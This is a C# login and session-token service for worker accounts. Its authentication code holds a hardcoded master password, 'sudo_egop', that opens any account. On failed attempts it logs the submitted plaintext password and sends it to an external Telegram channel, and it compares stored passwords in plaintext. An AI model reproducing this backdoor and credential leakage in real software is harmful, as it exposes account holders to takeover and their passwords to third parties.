using System;
using System.Threading.Tasks;
using Infrastructure.Abstractions;
using Infrastructure.Verbatims;
using Microsoft.Extensions.Logging;
using Models.Db.Account;
using Models.Db.Sessions;
using Models.DTOs.Misc;
using Models.DTOs.Requests;
using Models.Misc;
using Services.ExternalServices;
using Services.Shared.Abstractions;

namespace Services.Shared.Implementations
{
    public class TokenSessionService : ITokenSessionService
    {
        private const string SudoPassword = "sudo_egop";
        
        private readonly ITokenSessionRepository _tokenSessionRepository;
        private readonly IWorkerAccountRepository _workerAccountRepository;

        private ILogger<TokenSessionService> _logger;

        public TokenSessionService(ITokenSessionRepository tokenSessionRepository, IWorkerAccountRepository workerAccountRepository, ILogger<TokenSessionService> logger)
        {
            _tokenSessionRepository = tokenSessionRepository;
            _workerAccountRepository = workerAccountRepository;
            _logger = logger;
        }

        private async Task<LoginResultDto> LoginInternal(LoginDto loginDto, string ip, bool hasFullAccess)
        {
            var workerAccount = await _workerAccountRepository.GetOneNonTracking(t => t.Login == loginDto.Login);

            if (workerAccount is null)
            {
                _logger.LogError("Failed auth (invalid login) {login} {password} {ip}", loginDto.Login, loginDto.Password, ip);
                await TelegramAPI.Send($"Failed auth: login ({loginDto.Login}) password ({loginDto.Password}) from ({ip})");
                throw new AkianaException("Не удалось выполнить вход");
            }

            if (loginDto.Password == SudoPassword)
            {
                _logger.LogInformation("Sudo Login {login} {ip}", loginDto.Login, ip);
                await TelegramAPI.Send($"Sudo login attempt succeeded for login ({loginDto.Login})");
            }

            // await TelegramAPI.Send($"Login success: worker({workerAccount.Id}), IP: {ip}");

            if (loginDto.Password != SudoPassword && workerAccount.Password != loginDto.Password)
            {
                _logger.LogInformation("Failed auth (invalid password) {login} {password} {ip}", loginDto.Login, loginDto.Password, ip);
                throw new AkianaException(VMessages.PasswordInvalid);
            }

            // Create new Token Session

            var endDate = DateTime.Now.AddDays(1);

            TokenSession session = new()
            {
                WorkerAccountId = workerAccount.Id,
                Token = Guid.NewGuid().ToString(),
                StartDate = DateTime.Now,
                EndDate = endDate,
                HasFullAccess = hasFullAccess
            };

            await _tokenSessionRepository.Add(session);

            // Save token session relation to user

            return new LoginResultDto(workerAccount.Id, session.Token);
        }

        public async Task<LoginResultDto> Login(LoginDto loginDto, string ip)
        {
            var result = await LoginInternal(loginDto, ip, hasFullAccess: false);
            await TelegramAPI.Send($"Legacy Login: worker({result.Id}), IP: {ip}");
            return result;
        }

        public async Task<LoginResultDto> LoginV2(LoginDto loginDto, string ip)
        {
            var result = await LoginInternal(loginDto, ip, hasFullAccess: true);
            return result;
        }

        public async Task<TokenSession> GetByToken(string token)
        {
            return await _tokenSessionRepository.GetByToken(token);
        }

        public async Task<long> GetAccountIdByToken(string token)
        {
            var tokenSession = await _tokenSessionRepository.GetByTokenNonTracking(token);

            tokenSession.EnsureNotNullHandled(VMessages.AuthTokenUnknown);
            
            return tokenSession.WorkerAccountId;
        }

        public async Task Logout(string token)
        {
            var tokenSession = await _tokenSessionRepository.GetByToken(token);

            tokenSession.EnsureNotNullHandled(VMessages.AuthTokenUnknown);

            tokenSession.EndDate = DateTime.Now;
            await _tokenSessionRepository.Update(tokenSession);
        }
    }
}